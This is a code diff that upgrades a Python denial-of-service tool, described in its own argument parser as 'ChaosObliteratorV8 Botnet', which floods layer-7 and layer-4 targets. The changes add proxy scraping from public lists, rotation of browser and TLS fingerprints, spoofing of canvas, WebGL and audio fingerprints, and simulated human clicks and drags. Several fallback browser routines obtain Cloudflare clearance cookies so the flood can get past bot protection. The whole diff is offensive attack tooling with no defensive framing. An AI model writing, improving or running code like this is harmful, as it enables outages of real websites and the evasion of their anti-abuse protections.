@@ -30,10 +30,10 @@ from selenium.webdriver.chrome.options import Options
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s - [%(levelname)s] %(message)s",
-    handlers=[logging.FileHandler("chaos_obliterator_v7.log"), logging.StreamHandler()]
+    handlers=[logging.FileHandler("chaos_obliterator_v8.log"), logging.StreamHandler()]
 )
 
-class ChaosObliteratorV7:
+class ChaosObliteratorV8:
     def __init__(self, target_l7: str = None, target_l4: str = None, duration: int = 60, threads: int = 30, methods: List[str] = None, proxy: str = None):
         self.target_l7 = target_l7.replace("https://", "").replace("http://", "").replace("www.", "").split("/")[0] if target_l7 else None
         self.target_l4 = target_l4 if target_l4 else None
@@ -43,7 +43,8 @@ class ChaosObliteratorV7:
         self.end_time = time.time() + duration
         self.user_agents = [
             f"Mozilla/5.0 (Windows NT {random.uniform(12.0, 18.0):.1f}; Win64; x64) AppleWebKit/537.{random.randint(80, 90)} (KHTML, like Gecko) Chrome/{random.randint(124, 126)}.0.0.0 Safari/537.{random.randint(80, 90)}",
-            f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(16, 20)}_0 like Mac OS X) AppleWebKit/605.1.{random.randint(40, 50)} (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
+            f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(16, 20)}_0 like Mac OS X) AppleWebKit/605.1.{random.randint(40, 50)} (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
+            f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{random.randint(14, 15)}_{random.randint(0, 5)}) AppleWebKit/537.{random.randint(80, 90)} (KHTML, like Gecko) Chrome/{random.randint(124, 126)}.0.0.0 Safari/537.{random.randint(80, 90)}"
         ]
         self.success_count = {m: 0 for m in self.methods}
         self.response_times = {m: [] for m in ["chaoshttp", "ghostloris"]}
@@ -59,23 +60,40 @@ class ChaosObliteratorV7:
         os.makedirs(self.screenshot_dir, exist_ok=True)
 
     def _get_proxy_pool(self) -> List[str]:
-        """Fetch proxy pool from proxyscrape API and filter by latency."""
-        try:
-            response = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks5&timeout=1000&country=all&ssl=all&anonymity=all")
-            proxies = response.text.splitlines()
-            valid_proxies = []
-            for proxy in proxies:
-                if proxy:
-                    try:
-                        test_response = requests.get("https://www.google.com", proxies={"https": proxy}, timeout=1)
-                        if test_response.status_code == 200:
-                            valid_proxies.append(proxy)
-                    except:
-                        pass
-            return valid_proxies if valid_proxies else [self.proxy] if self.proxy else [None]
-        except:
-            logging.warning("Failed to fetch proxy pool, using provided proxy or None.")
-            return [self.proxy] if self.proxy else [None]
+        """Fetch proxy pool from multiple sources and filter by latency."""
+        proxies = []
+        sources = [
+            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks5&timeout=1000&country=all&ssl=all&anonymity=all",
+            "https://www.free-proxy-list.net/"
+        ]
+        for source in sources:
+            try:
+                if "proxyscrape" in source:
+                    response = requests.get(source, timeout=5)
+                    proxies.extend(response.text.splitlines())
+                else:
+                    response = requests.get(source, timeout=5)
+                    from bs4 import BeautifulSoup
+                    soup = BeautifulSoup(response.text, 'html.parser')
+                    for row in soup.select("table.table tbody tr"):
+                        cols = row.find_all("td")
+                        if len(cols) > 1:
+                            ip, port = cols[0].text, cols[1].text
+                            proxies.append(f"http://{ip}:{port}")
+            except:
+                logging.warning(f"Failed to fetch proxies from {source}")
+        valid_proxies = []
+        for proxy in proxies:
+            if proxy and len(valid_proxies) < 10:
+                try:
+                    start_time = time.time()
+                    test_response = requests.get("https://www.google.com", proxies={"https": proxy}, timeout=1)
+                    if test_response.status_code == 200 and (time.time() - start_time) * 1000 < 1000:
+                        valid_proxies.append(proxy)
+                        logging.info(f"Proxy {proxy} added to pool (latency: {(time.time() - start_time) * 1000:.2f}ms)")
+                except:
+                    pass
+        return valid_proxies if valid_proxies else [self.proxy] if self.proxy else [None]
 
     def _random_payload(self, size: int = 512) -> bytes:
         """Upgraded polymorphic payload with larger size."""
@@ -87,11 +105,14 @@ class ChaosObliteratorV7:
         return (hash4 + hash3 + hash2 + os.urandom(1))[:size]
 
     def _random_path(self) -> str:
-        """Dynamic obfuscated URL paths."""
-        prefixes = ["v15", "chaos", "obliterator", "nexus", "vortex"]
+        """Dynamic obfuscated URL paths with fallback paths."""
+        prefixes = ["v16", "chaos", "obliterator", "nexus", "vortex"]
         segments = [''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(45, 60))) for _ in range(random.randint(12, 15))]
         query = f"?matrix={''.join(random.choices(string.hexdigits.lower(), k=52))}&epoch={random.randint(100000000000000, 999999999999999)}"
-        return f"/{random.choice(prefixes)}/{'/'.join(segments)}{query}"
+        return random.choice([
+            f"/{random.choice(prefixes)}/{'/'.join(segments)}{query}",
+            "/home", "/about", "/contact", "/"
+        ])
 
     def _random_ip(self) -> str:
         """Spoofed IP for headers."""
@@ -106,8 +127,8 @@ class ChaosObliteratorV7:
             "Cache-Control": "no-cache, no-store, must-revalidate",
             "Connection": "keep-alive",
             "Sec-Ch-Ua": f'"Google Chrome";v="{random.randint(124, 126)}", "Not;A=Brand";v="8", "Chromium";v="{random.randint(124, 126)}"',
-            "Sec-Ch-Ua-Mobile": "?0",
-            "Sec-Ch-Ua-Platform": '"Windows"'
+            "Sec-Ch-Ua-Mobile": random.choice(["?0", "?1"]),
+            "Sec-Ch-Ua-Platform": random.choice(['"Windows"', '"macOS"', '"Linux"'])
         }
         headers.update(self.session_headers)
         if random.random() < 0.99:
@@ -123,11 +144,14 @@ class ChaosObliteratorV7:
             json.dump(data, f, indent=2)
         logging.info(f"Cookies saved to {self.cookie_file}")
 
-    def _save_screenshot(self, page, attempt: int):
-        """Save screenshot for debugging."""
-        screenshot_path = os.path.join(self.screenshot_dir, f"screenshot_attempt_{attempt}_{int(time.time())}.png")
-        page.screenshot(path=screenshot_path)
-        logging.info(f"Screenshot saved to {screenshot_path}")
+    def _save_screenshot(self, page, attempt: int, error_type: str):
+        """Save screenshot for debugging with error type."""
+        screenshot_path = os.path.join(self.screenshot_dir, f"{error_type}_attempt_{attempt}_{int(time.time())}.png")
+        try:
+            page.screenshot(path=screenshot_path)
+            logging.info(f"Screenshot saved to {screenshot_path}")
+        except:
+            logging.warning(f"Failed to save screenshot to {screenshot_path}")
 
     def _get_browser_session(self):
         """Use headless browser to bypass JS challenges with advanced emulation."""
@@ -139,7 +163,7 @@ class ChaosObliteratorV7:
             {"width": random.randint(1366, 1920), "height": random.randint(768, 1200)}
         ]
         while attempt < max_attempts:
-            proxy = random.choice(self.proxy_pool)
+            proxy = random.choice(self.proxy_pool) if self.proxy_pool else None
             try:
                 cmd = ["xvfb-run", "--auto-servernum", "python3", "-c", "import playwright"]
                 if os.system("command -v xvfb-run > /dev/null") == 0:
@@ -157,7 +181,7 @@ class ChaosObliteratorV7:
                     # Log network events
                     page.on("response", lambda response: logging.debug(f"Network response: {response.url} - Status {response.status}"))
                     
-                    # Inject canvas/WebGL/font spoofing
+                    # Inject canvas/WebGL/font/audio spoofing
                     page.evaluate("""
                         () => {
                             // Canvas spoofing
@@ -184,11 +208,18 @@ class ChaosObliteratorV7:
                             // Touch event spoofing
                             window.ontouchstart = () => {};
                             window.ontouchmove = () => {};
+                            // Audio context spoofing
+                            const origAudioContext = window.AudioContext;
+                            window.AudioContext = function() {
+                                const ctx = new origAudioContext();
+                                ctx.sampleRate = 44100 + Math.random() * 100;
+                                return ctx;
+                            };
                         }
                     """)
                     
                     # Advanced human behavior emulation
-                    page.goto(f"https://{self.target_l7}", wait_until="domcontentloaded", timeout=30000)
+                    page.goto(f"https://{self.target_l7}{self._random_path()}", wait_until="domcontentloaded", timeout=30000)
                     time.sleep(random.uniform(1, 3))
                     
                     # Gradual scroll
@@ -214,10 +245,39 @@ class ChaosObliteratorV7:
                             page.mouse.move(x, y)
                             time.sleep(random.uniform(0.01, 0.03))
                     
-                    # Simulate hover
-                    if page.query_selector("a, button"):
-                        page.query_selector("a, button").hover()
-                        time.sleep(random.uniform(0.2, 0.5))
+                    # Simulate hover with fallback
+                    try:
+                        elements = page.query_selector_all("a, button")
+                        if elements:
+                            element = random.choice(elements)
+                            # Check for blocking elements
+                            blocking = page.evaluate("""
+                                (element) => {
+                                    const rect = element.getBoundingClientRect();
+                                    const topElement = document.elementFromPoint(rect.left + rect.width / 2, rect.top + rect.height / 2);
+                                    return topElement !== element ? topElement.outerHTML : null;
+                                }
+                            """, element)
+                            if blocking:
+                                logging.warning(f"Attempt {attempt + 1}: Blocking element detected: {blocking[:100]}")
+                                page.evaluate("element => element.dispatchEvent(new MouseEvent('mouseover'))", element)
+                            else:
+                                element.hover(timeout=5000)
+                            time.sleep(random.uniform(0.2, 0.5))
+                        else:
+                            logging.warning(f"Attempt {attempt + 1}: No hoverable elements found.")
+                    except Exception as e:
+                        logging.error(f"Attempt {attempt + 1}: Hover failed: {e}")
+                        self._save_screenshot(page, attempt + 1, "hover_timeout")
+                        attempt += 1
+                        browser.close()
+                        continue
+                    
+                    # Simulate drag event
+                    page.mouse.down()
+                    page.mouse.move(random.randint(100, 800), random.randint(100, 600), steps=10)
+                    page.mouse.up()
+                    time.sleep(random.uniform(0.3, 0.7))
                     
                     # Random page refresh
                     if random.random() < 0.3:
@@ -226,7 +286,7 @@ class ChaosObliteratorV7:
                     
                     page.mouse.click(random.randint(100, 800), random.randint(100, 600))  # Random click
                     time.sleep(random.uniform(0.5, 1.5))
-                    page.keyboard.press("Tab")  # Simulate tab key
+                    page.keyboard.press("Control+R")  # Simulate refresh shortcut
                     time.sleep(random.uniform(0.2, 0.8))
                     if page.query_selector("input[type='text']"):
                         page.fill("input[type='text']", ''.join(random.choices(string.ascii_letters, k=10)))
@@ -236,7 +296,7 @@ class ChaosObliteratorV7:
                     response = page.evaluate("() => document.readyState")
                     if response != "complete":
                         logging.warning(f"Attempt {attempt + 1}: Page not fully loaded.")
-                        self._save_screenshot(page, attempt + 1)
+                        self._save_screenshot(page, attempt + 1, "page_not_loaded")
                         attempt += 1
                         browser.close()
                         continue
@@ -246,7 +306,7 @@ class ChaosObliteratorV7:
                     response_body = page.content()[:200]  # Log first 200 chars
                     if status in [403, 429]:
                         logging.warning(f"Attempt {attempt + 1}: HTTP {status} detected. Response: {response_body}")
-                        self._save_screenshot(page, attempt + 1)
+                        self._save_screenshot(page, attempt + 1, "http_error")
                         attempt += 1
                         browser.close()
                         continue
@@ -255,10 +315,11 @@ class ChaosObliteratorV7:
                     cookies = context.cookies()
                     cf_clearance = any(cookie["name"] == "cf_clearance" for cookie in cookies)
                     cf_bm = any(cookie["name"] == "__cf_bm" for cookie in cookies)
+                    cf_chl = any(cookie["name"].startswith("cf_chl") for cookie in cookies)
                     if not (cf_clearance and cf_bm):
                         logging.warning(f"Attempt {attempt + 1}: Missing cf_clearance or __cf_bm, retrying... Response: {response_body}")
                         self._save_cookies(cookies)
-                        self._save_screenshot(page, attempt + 1)
+                        self._save_screenshot(page, attempt + 1, "cookie_missing")
                         attempt += 1
                         browser.close()
                         continue
@@ -270,7 +331,7 @@ class ChaosObliteratorV7:
                     if test_response.status_code != 200:
                         logging.warning(f"Attempt {attempt + 1}: Cookie validation failed, status {test_response.status_code}. Response: {test_response.text[:200]}")
                         self._save_cookies(cookies, test_response.headers)
-                        self._save_screenshot(page, attempt + 1)
+                        self._save_screenshot(page, attempt + 1, "cookie_validation_failed")
                         attempt += 1
                         browser.close()
                         continue
@@ -280,7 +341,7 @@ class ChaosObliteratorV7:
                         if "expires" in cookie and cookie["expires"] < time.time() + 60:
                             logging.warning(f"Attempt {attempt + 1}: Cookie {cookie['name']} expires too soon, retrying...")
                             self._save_cookies(cookies, test_response.headers)
-                            self._save_screenshot(page, attempt + 1)
+                            self._save_screenshot(page, attempt + 1, "cookie_expiry")
                             attempt += 1
                             browser.close()
                             continue
@@ -302,6 +363,7 @@ class ChaosObliteratorV7:
                     return
             except Exception as e:
                 logging.error(f"Playwright failed: {e}")
+                self._save_screenshot(page, attempt + 1, "playwright_error")
                 attempt += 1
                 if attempt == max_attempts:
                     logging.warning("Switching to undetected_chromedriver fallback...")
@@ -319,7 +381,7 @@ class ChaosObliteratorV7:
             {"width": random.randint(1366, 1920), "height": random.randint(768, 1200)}
         ]
         while attempt < max_attempts:
-            proxy = random.choice(self.proxy_pool)
+            proxy = random.choice(self.proxy_pool) if self.proxy_pool else None
             try:
                 options = uc.ChromeOptions()
                 options.add_argument(f"--user-agent={random.choice(self.user_agents)}")
@@ -328,7 +390,7 @@ class ChaosObliteratorV7:
                     options.add_argument(f"--proxy-server={proxy}")
                 driver = uc.Chrome(options=options, headless=True, use_subprocess=False)
                 
-                # Canvas/WebGL/font spoofing
+                # Canvas/WebGL/font/audio spoofing
                 driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
                     "source": """
                         Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
@@ -353,10 +415,16 @@ class ChaosObliteratorV7:
                         });
                         window.ontouchstart = () => {};
                         window.ontouchmove = () => {};
+                        const origAudioContext = window.AudioContext;
+                        window.AudioContext = function() {
+                            const ctx = new origAudioContext();
+                            ctx.sampleRate = 44100 + Math.random() * 100;
+                            return ctx;
+                        };
                     """
                 })
                 
-                driver.get(f"https://{self.target_l7}")
+                driver.get(f"https://{self.target_l7}{self._random_path()}")
                 time.sleep(random.uniform(1, 3))
                 
                 # Gradual scroll
@@ -382,13 +450,39 @@ class ChaosObliteratorV7:
                         driver.execute_script(f"document.elementFromPoint({x}, {y}).dispatchEvent(new MouseEvent('mousemove', {{clientX: {x}, clientY: {y}}}))")
                         time.sleep(random.uniform(0.01, 0.03))
                 
-                # Simulate hover
+                # Simulate hover with fallback
                 try:
-                    element = driver.find_element(By.CSS_SELECTOR, "a, button")
-                    driver.execute_script("arguments[0].dispatchEvent(new MouseEvent('mouseover'))", element)
-                    time.sleep(random.uniform(0.2, 0.5))
-                except:
-                    pass
+                    elements = driver.find_elements(By.CSS_SELECTOR, "a, button")
+                    if elements:
+                        element = random.choice(elements)
+                        blocking = driver.execute_script("""
+                            return (element) => {
+                                const rect = element.getBoundingClientRect();
+                                const topElement = document.elementFromPoint(rect.left + rect.width / 2, rect.top + rect.height / 2);
+                                return topElement !== element ? topElement.outerHTML : null;
+                            }
+                        """, element)
+                        if blocking:
+                            logging.warning(f"Fallback attempt {attempt + 1}: Blocking element detected: {blocking[:100]}")
+                            driver.execute_script("arguments[0].dispatchEvent(new MouseEvent('mouseover'))", element)
+                        else:
+                            driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", element)
+                            element.click()  # Click to simulate hover
+                        time.sleep(random.uniform(0.2, 0.5))
+                    else:
+                        logging.warning(f"Fallback attempt {attempt + 1}: No hoverable elements found.")
+                except Exception as e:
+                    logging.error(f"Fallback attempt {attempt + 1}: Hover failed: {e}")
+                    self._save_screenshot(driver, attempt + 1, "hover_timeout_fallback")
+                    attempt += 1
+                    driver.quit()
+                    continue
+                
+                # Simulate drag event
+                driver.execute_script("document.elementFromPoint(500, 300).dispatchEvent(new MouseEvent('mousedown'))")
+                driver.execute_script("document.elementFromPoint(600, 400).dispatchEvent(new MouseEvent('mousemove'))")
+                driver.execute_script("document.elementFromPoint(600, 400).dispatchEvent(new MouseEvent('mouseup'))")
+                time.sleep(random.uniform(0.3, 0.7))
                 
                 # Random page refresh
                 if random.random() < 0.3:
@@ -411,9 +505,11 @@ class ChaosObliteratorV7:
                 cookies = driver.get_cookies()
                 cf_clearance = any(cookie["name"] == "cf_clearance" for cookie in cookies)
                 cf_bm = any(cookie["name"] == "__cf_bm" for cookie in cookies)
+                cf_chl = any(cookie["name"].startswith("cf_chl") for cookie in cookies)
                 if not (cf_clearance and cf_bm):
                     logging.error(f"Fallback attempt {attempt + 1}: Missing cf_clearance or __cf_bm.")
                     self._save_cookies(cookies)
+                    self._save_screenshot(driver, attempt + 1, "cookie_missing_fallback")
                     attempt += 1
                     driver.quit()
                     continue
@@ -425,6 +521,7 @@ class ChaosObliteratorV7:
                 if test_response.status_code != 200:
                     logging.error(f"Fallback attempt {attempt + 1}: Cookie validation failed, status {test_response.status_code}. Response: {test_response.text[:200]}")
                     self._save_cookies(cookies, test_response.headers)
+                    self._save_screenshot(driver, attempt + 1, "cookie_validation_failed_fallback")
                     attempt += 1
                     driver.quit()
                     continue
@@ -434,6 +531,7 @@ class ChaosObliteratorV7:
                     if "expires" in cookie and cookie["expires"] < time.time() + 60:
                         logging.error(f"Fallback attempt {attempt + 1}: Cookie {cookie['name']} expires too soon.")
                         self._save_cookies(cookies, test_response.headers)
+                        self._save_screenshot(driver, attempt + 1, "cookie_expiry_fallback")
                         attempt += 1
                         driver.quit()
                         continue
@@ -454,6 +552,7 @@ class ChaosObliteratorV7:
                 return
             except Exception as e:
                 logging.error(f"Fallback failed: {e}")
+                self._save_screenshot(driver, attempt + 1, "fallback_error")
                 attempt += 1
                 if attempt == max_attempts:
                     logging.warning("Switching to selenium-stealth fallback...")
@@ -472,7 +571,7 @@ class ChaosObliteratorV7:
         platforms = ["Win32", "MacIntel", "Linux x86_64"]
         timezones = ["Asia/Jakarta", "America/New_York", "Europe/London"]
         while attempt < max_attempts:
-            proxy = random.choice(self.proxy_pool)
+            proxy = random.choice(self.proxy_pool) if self.proxy_pool else None
             try:
                 options = Options()
                 options.add_argument(f"--user-agent={random.choice(self.user_agents)}")
@@ -490,7 +589,7 @@ class ChaosObliteratorV7:
                     timezone=random.choice(timezones)
                 )
                 
-                driver.get(f"https://{self.target_l7}")
+                driver.get(f"https://{self.target_l7}{self._random_path()}")
                 time.sleep(random.uniform(1, 3))
                 
                 # Gradual scroll
@@ -516,13 +615,39 @@ class ChaosObliteratorV7:
                         driver.execute_script(f"document.elementFromPoint({x}, {y}).dispatchEvent(new MouseEvent('mousemove', {{clientX: {x}, clientY: {y}}}))")
                         time.sleep(random.uniform(0.01, 0.03))
                 
-                # Simulate hover
+                # Simulate hover with fallback
                 try:
-                    element = driver.find_element(By.CSS_SELECTOR, "a, button")
-                    driver.execute_script("arguments[0].dispatchEvent(new MouseEvent('mouseover'))", element)
-                    time.sleep(random.uniform(0.2, 0.5))
-                except:
-                    pass
+                    elements = driver.find_elements(By.CSS_SELECTOR, "a, button")
+                    if elements:
+                        element = random.choice(elements)
+                        blocking = driver.execute_script("""
+                            return (element) => {
+                                const rect = element.getBoundingClientRect();
+                                const topElement = document.elementFromPoint(rect.left + rect.width / 2, rect.top + rect.height / 2);
+                                return topElement !== element ? topElement.outerHTML : null;
+                            }
+                        """, element)
+                        if blocking:
+                            logging.warning(f"Selenium attempt {attempt + 1}: Blocking element detected: {blocking[:100]}")
+                            driver.execute_script("arguments[0].dispatchEvent(new MouseEvent('mouseover'))", element)
+                        else:
+                            driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", element)
+                            element.click()  # Click to simulate hover
+                        time.sleep(random.uniform(0.2, 0.5))
+                    else:
+                        logging.warning(f"Selenium attempt {attempt + 1}: No hoverable elements found.")
+                except Exception as e:
+                    logging.error(f"Selenium attempt {attempt + 1}: Hover failed: {e}")
+                    self._save_screenshot(driver, attempt + 1, "hover_timeout_selenium")
+                    attempt += 1
+                    driver.quit()
+                    continue
+                
+                # Simulate drag event
+                driver.execute_script("document.elementFromPoint(500, 300).dispatchEvent(new MouseEvent('mousedown'))")
+                driver.execute_script("document.elementFromPoint(600, 400).dispatchEvent(new MouseEvent('mousemove'))")
+                driver.execute_script("document.elementFromPoint(600, 400).dispatchEvent(new MouseEvent('mouseup'))")
+                time.sleep(random.uniform(0.3, 0.7))
                 
                 # Random page refresh
                 if random.random() < 0.3:
@@ -545,9 +670,11 @@ class ChaosObliteratorV7:
                 cookies = driver.get_cookies()
                 cf_clearance = any(cookie["name"] == "cf_clearance" for cookie in cookies)
                 cf_bm = any(cookie["name"] == "__cf_bm" for cookie in cookies)
+                cf_chl = any(cookie["name"].startswith("cf_chl") for cookie in cookies)
                 if not (cf_clearance and cf_bm):
                     logging.error(f"Selenium attempt {attempt + 1}: Missing cf_clearance or __cf_bm.")
                     self._save_cookies(cookies)
+                    self._save_screenshot(driver, attempt + 1, "cookie_missing_selenium")
                     attempt += 1
                     driver.quit()
                     continue
@@ -559,6 +686,7 @@ class ChaosObliteratorV7:
                 if test_response.status_code != 200:
                     logging.error(f"Selenium attempt {attempt + 1}: Cookie validation failed, status {test_response.status_code}. Response: {test_response.text[:200]}")
                     self._save_cookies(cookies, test_response.headers)
+                    self._save_screenshot(driver, attempt + 1, "cookie_validation_failed_selenium")
                     attempt += 1
                     driver.quit()
                     continue
@@ -568,6 +696,7 @@ class ChaosObliteratorV7:
                     if "expires" in cookie and cookie["expires"] < time.time() + 60:
                         logging.error(f"Selenium attempt {attempt + 1}: Cookie {cookie['name']} expires too soon.")
                         self._save_cookies(cookies, test_response.headers)
+                        self._save_screenshot(driver, attempt + 1, "cookie_expiry_selenium")
                         attempt += 1
                         driver.quit()
                         continue
@@ -588,6 +717,7 @@ class ChaosObliteratorV7:
                 return
             except Exception as e:
                 logging.error(f"Selenium failed: {e}")
+                self._save_screenshot(driver, attempt + 1, "selenium_error")
                 attempt += 1
         logging.error("Selenium failed after max attempts.")
 
@@ -596,16 +726,18 @@ class ChaosObliteratorV7:
         max_attempts = 3
         attempt = 0
         while attempt < max_attempts:
-            proxy = random.choice(self.proxy_pool)
+            proxy = random.choice(self.proxy_pool) if self.proxy_pool else None
             try:
                 scraper = cloudscraper.create_scraper()
-                response = scraper.get(f"https://{self.target_l7}", proxies={"https": proxy} if proxy else None)
+                response = scraper.get(f"https://{self.target_l7}{self._random_path()}", proxies={"https": proxy} if proxy else None)
                 cookies = response.cookies.get_dict()
                 cf_clearance = "cf_clearance" in cookies
                 cf_bm = "__cf_bm" in cookies
+                cf_chl = any(name.startswith("cf_chl") for name in cookies)
                 if not (cf_clearance and cf_bm):
                     logging.error(f"Cloudscraper attempt {attempt + 1}: Missing cf_clearance or __cf_bm. Response: {response.text[:200]}")
                     self._save_cookies(cookies, response.headers)
+                    self._save_screenshot(scraper, attempt + 1, "cookie_missing_cloudscraper")
                     attempt += 1
                     continue
                 
@@ -616,17 +748,18 @@ class ChaosObliteratorV7:
                 if test_response.status_code != 200:
                     logging.error(f"Cloudscraper attempt {attempt + 1}: Cookie validation failed, status {test_response.status_code}. Response: {test_response.text[:200]}")
                     self._save_cookies(cookies, response.headers)
+                    self._save_screenshot(scraper, attempt + 1, "cookie_validation_failed_cloudscraper")
                     attempt += 1
                     continue
                 
                 # Check cookie expiry
                 for name, value in cookies.items():
-                    if name in ["cf_clearance", "__cf_bm"]:
-                        if response.cookies[name].expires < time.time() + 60:
-                            logging.error(f"Cloudscraper attempt {attempt + 1}: Cookie {name} expires too soon.")
-                            self._save_cookies(cookies, response.headers)
-                            attempt += 1
-                            continue
+                    if name in ["cf_clearance", "__cf_bm"] and response.cookies[name].expires < time.time() + 60:
+                        logging.error(f"Cloudscraper attempt {attempt + 1}: Cookie {name} expires too soon.")
+                        self._save_cookies(cookies, response.headers)
+                        self._save_screenshot(scraper, attempt + 1, "cookie_expiry_cloudscraper")
+                        attempt += 1
+                        continue
                 
                 # Store cookies in RequestsCookieJar
                 for name, value in cookies.items():
@@ -643,6 +776,7 @@ class ChaosObliteratorV7:
                 return
             except Exception as e:
                 logging.error(f"Cloudscraper failed: {e}")
+                self._save_screenshot(scraper, attempt + 1, "cloudscraper_error")
                 attempt += 1
                 if attempt == max_attempts:
                     logging.warning("Switching to HTTP/2 fallback...")
@@ -660,7 +794,7 @@ class ChaosObliteratorV7:
             h2conn = h2.connection.H2Connection()
             h2conn.initiate_connection()
             sock.sendall(h2conn.data_to_send())
-            headers = {":method": "GET", ":authority": self.target_l7, ":scheme": "https", ":path": "/"}
+            headers = {":method": "GET", ":authority": self.target_l7, ":scheme": "https", ":path": self._random_path()}
             headers.update(self._random_headers())
             h2conn.send_headers(1, headers, end_stream=True)
             sock.sendall(h2conn.data_to_send())
@@ -673,7 +807,7 @@ class ChaosObliteratorV7:
                 events = h2conn.receive_data(data)
                 for event in events:
                     if isinstance(event, h2.events.ResponseReceived):
-                        logging.debug(f"HTTP/2 response headers: {event.headers}")
+                        logging.debug(f"HTTP/2 response headers: {event.headers}, body: {response[:200].decode('utf-8', errors='ignore')}")
                         cookies = [h for h in event.headers if h[0] == b"set-cookie"]
                         if cookies:
                             cookie_dict = {}
@@ -682,6 +816,7 @@ class ChaosObliteratorV7:
                                 cookie_dict[name] = value
                             cf_clearance = "cf_clearance" in cookie_dict
                             cf_bm = "__cf_bm" in cookie_dict
+                            cf_chl = any(name.startswith("cf_chl") for name in cookie_dict)
                             if cf_clearance and cf_bm:
                                 for name, value in cookie_dict.items():
                                     self.cookies.set(name, value, domain=self.target_l7, path="/")
@@ -781,7 +916,7 @@ class ChaosObliteratorV7:
         if not self.target_l7:
             return
         session = tls_client.Session(
-            client_identifier=f"chrome_{random.randint(124, 126)}",
+            client_identifier=random.choice([f"chrome_{random.randint(124, 126)}", "firefox_126", "edge_125"]),
             random_tls_extension_order=True
         )
         while time.time() < self.end_time:
@@ -833,7 +968,7 @@ class ChaosObliteratorV7:
             return
         try:
             session = tls_client.Session(
-                client_identifier=f"chrome_{random.randint(124, 126)}",
+                client_identifier=random.choice([f"chrome_{random.randint(124, 126)}", "firefox_126", "edge_125"]),
                 random_tls_extension_order=True
             )
             while time.time() < self.end_time:
@@ -909,16 +1044,16 @@ class ChaosObliteratorV7:
             "response_times": {k: sum(v)/len(v) if v else 0 for k, v in self.response_times.items()},
             "cookies": dict(self.cookies)
         }
-        with open("chaos_obliterator_v7_state.json", "w") as f:
+        with open("chaos_obliterator_v8_state.json", "w") as f:
             json.dump(state, f, indent=2)
-        logging.info("State saved to chaos_obliterator_v7_state.json")
+        logging.info("State saved to chaos_obliterator_v8_state.json")
 
     def start(self):
         """Unleash the upgraded chaos obliterator."""
         if not self.target_l7 and not self.target_l4:
             logging.error("At least one target (L7 or L4) required")
             return
-        logging.info(f"ChaosObliteratorV7 strike on L7: {self.target_l7 or 'None'}, L4: {self.target_l4 or 'None'}, methods: {self.methods}, proxy pool: {len(self.proxy_pool)} proxies")
+        logging.info(f"ChaosObliteratorV8 strike on L7: {self.target_l7 or 'None'}, L4: {self.target_l4 or 'None'}, methods: {self.methods}, proxy pool: {len(self.proxy_pool)} proxies")
         
         # Check environment
         if not self._check_environment():
@@ -963,11 +1098,11 @@ class ChaosObliteratorV7:
 
 def main(target_l7: str, target_l4: str, duration: int, methods: str, proxy: str):
     methods = methods.split(",")
-    obliterator = ChaosObliteratorV7(target_l7, target_l4, duration, methods=methods, proxy=proxy)
+    obliterator = ChaosObliteratorV8(target_l7, target_l4, duration, methods=methods, proxy=proxy)
     obliterator.start()
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="ChaosObliteratorV7 Botnet")
+    parser = argparse.ArgumentParser(description="ChaosObliteratorV8 Botnet")
     parser.add_argument("target_l7", nargs="?", default=None, help="L7 target URL (e.g., http://httpbin.org)")
     parser.add_argument("target_l4", nargs="?", default=None, help="L4 target IP (e.g., 93.184.216.34)")
     parser.add_argument("--duration", type=int, default=60, help="Duration in seconds")
